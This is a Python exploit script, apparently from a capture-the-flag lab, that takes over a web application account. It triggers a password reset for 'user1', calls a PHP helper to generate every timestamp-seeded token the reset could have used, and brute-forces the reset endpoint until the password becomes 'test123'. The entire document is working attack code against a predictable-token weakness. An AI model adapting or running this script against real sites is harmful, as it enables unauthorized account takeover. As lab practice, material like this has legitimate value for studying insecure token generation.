# Generate every possible token using the function generateToken

import subprocess
import requests
import time

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

resetUrl = "http://172.17.0.2/forgotpassword.php"

params = {"username":"user1"}

# Doing reset request and saving timestamp to use in token_list.php
t_start = int(time.time()*1000)
resetRequest = requests.post(resetUrl, verify=False, proxies=proxies, data=params, allow_redirects=False)
t_end = int(time.time()*1000)


proc = subprocess.Popen("php /home/kali/Challenges/tudo/myExploits/token_list.php %d %d" %(t_start,t_end), shell=True, stdout=subprocess.PIPE)
script_response = proc.stdout.read().decode("UTF-8").split("\n")[:-1]

url = "http://172.17.0.2/resetpassword.php"

# print(script_response)

for i in range(len(script_response)):

    # print("Testing", script_response[i])

    resetParams = {
        "token": script_response[i],
        "password1": "test123",
        "password2": "test123"
    }

    resetAttempt = requests.post(url, verify=False, proxies=proxies, data=resetParams, allow_redirects=False)

    if "Password changed!" in resetAttempt.text:
        print("Token found:", script_response[i])
        print("Password changed to test123!")
        exit()